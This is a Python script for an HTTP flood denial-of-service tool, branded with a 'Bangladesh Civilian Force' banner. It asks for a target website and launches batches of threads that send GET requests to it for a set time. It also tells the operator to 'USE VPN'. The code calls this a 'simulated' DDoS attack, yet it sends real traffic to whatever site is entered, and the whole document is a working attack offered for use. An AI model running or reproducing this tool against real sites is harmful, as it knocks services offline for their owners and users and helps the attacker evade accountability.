import requests
import threading
import time
from colorama import init, Fore, Style

# Initialize colorama to support ANSI escape sequences on Windows
init(autoreset=True)

def establish_connection(url):
    """
    Establish a connection to the URL.
    """
    try:
        response = requests.get(url)
        print(Fore.GREEN + "Connection established with", url)
        return True
    except requests.RequestException as e:
        print(Fore.RED + "Error establishing connection:", e)
        return False

def send_request(session, url):
    """
    Send a request to the URL. Simulate DDoS attack.
    """
    try:
        response = session.get(url)
        print(Fore.YELLOW + "★ ★ 𝑫 𝑫 𝒐 𝑺  𝑨 𝒕 𝒕 𝒂 𝒄 𝒌  𝑫 𝒐 𝒏 𝒆 ★ ★")
    except requests.RequestException as e:
        print(Fore.RED + "Error occurred during DDoS attack:", e)

def start_ddos(url, num_threads=1000, duration=60):
    """
    Start a simulated DDoS attack on the specified URL.
    """
    if not establish_connection(url):
        print(Fore.RED + "Exiting program.")
        return

    print(Fore.CYAN + "Setting up threads...")
    time.sleep(5)  # Wait for 5 seconds before setting up threads

    end_time = time.time() + duration
    threads = []

    def attack():
        with requests.Session() as session:
            while time.time() < end_time:
                send_request(session, url)

    batch_size = 100
    while time.time() < end_time:
        for _ in range(batch_size):
            if time.time() >= end_time:
                break
            thread = threading.Thread(target=attack)
            threads.append(thread)
            thread.start()

        # Sleep for 0.5 seconds before starting the next batch
        time.sleep(0.5)

        # Clean up finished threads to avoid memory issues
        threads = [t for t in threads if t.is_alive()]

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    print(Fore.GREEN + "DDoS attack simulation completed.")

def main():
    """
    Main function to drive the script.
    """
    ascii_art = """
    ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░       ░▒▓███████▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓███████▓▒░  
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░         ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░         ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░        ░▒▓██████▓▒░   ░▒▓█▓▒░  ░▒▓████████▓▒░▒▓███████▓▒░  
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░   ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
   
                                                 𝔅𝔞𝔫𝔤𝔩𝔞𝔡𝔢𝔰𝔥 ℭ𝔦𝔳𝔦𝔩𝔦𝔞𝔫 𝔉𝔬𝔯𝔠𝔢                                                         
    """
    print(Fore.WHITE + ascii_art)

    # User input section
    target_website = input("Enter the target website link: ")
    target_ip = input("Enter the target IP address: ")
    total_threads = int(input("Enter the total threads (default is 1000): ") or 1000)
    attack_time = int(input("Enter the attack time in seconds (default is 60): ") or 60)

    print(Fore.RED + Style.BRIGHT + "USE VPN - USE VPN - USE VPN")

    # Start DDoS attack simulation
    start_ddos(target_website, total_threads, attack_time)

if __name__ == "__main__":
    main()
